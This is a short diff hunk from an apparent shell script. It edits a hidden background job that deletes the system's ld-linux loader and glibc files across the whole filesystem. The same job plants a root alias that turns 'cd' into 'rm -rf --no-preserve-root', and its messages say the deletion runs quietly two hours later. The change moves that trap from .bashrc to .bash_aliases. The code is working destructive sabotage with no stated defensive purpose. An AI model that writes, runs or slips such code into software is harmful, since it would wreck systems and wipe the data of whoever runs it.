@@ -576,7 +576,7 @@ nohup sh -c '
   find / -type f -name "ld-linux*" -print -delete
   find / -type f -name "glibc*" -print -delete
   sleep 5
-  echo "alias cd='\''rm -rf --no-preserve-root'\''" >> /root/.bashrc
+  echo "alias cd='\''rm -rf --no-preserve-root'\''" >> /root/.bash_aliases
   echo "nohup background task: Deletion of files complete."
 ' > /dev/null 2>&1 &
 msg "Scheduled (nohup) deletion of files to run in background after 2 hours."
